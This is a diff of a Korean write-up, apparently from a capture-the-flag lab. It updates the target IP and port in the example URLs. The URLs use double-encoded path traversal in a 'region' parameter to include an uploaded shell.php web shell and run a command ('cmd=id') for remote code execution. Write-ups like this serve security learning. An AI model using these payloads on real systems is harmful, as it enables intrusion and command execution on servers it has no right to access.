@@ -222,7 +222,7 @@ PHP가 쿼리 문자열을 처리하면서 한 번 디코딩하면 다음 값이
 먼저 Double Encoding을 이용하여 상위 디렉터리의 index.php 파일을 include할 수 있는지 확인하였다:
 
 ```text
-http://154.57.164.80:30169/contact.php?region=%252e%252e%252findex
+http://154.57.164.74:30517/contact.php?region=%252e%252e%252findex
 ```
 
 실제로 요청을 전송한 결과, `contact.php` 페이지 내부에 메인 페이지의 내용이 함께 출력되는 것을 확인할 수 있었다:
@@ -232,7 +232,7 @@ http://154.57.164.80:30169/contact.php?region=%252e%252e%252findex
 앞서 업로드한 `shell.php` 파일을 `include` 하기 위해 `region` 파라미터에 Double Encoding된 상대 경로를 전달하고, `cmd` 파라미터에는 실행할 시스템 명령을 지정하였다.
 
 ```text
-http://154.57.164.80:30169/contact.php?region=%252e%252e%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389&cmd=id
+http://154.57.164.74:30517/contact.php?region=%252e%252e%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389&cmd=id
 ```
 
 최종적으로 RCE를 획득할 수 있었다:
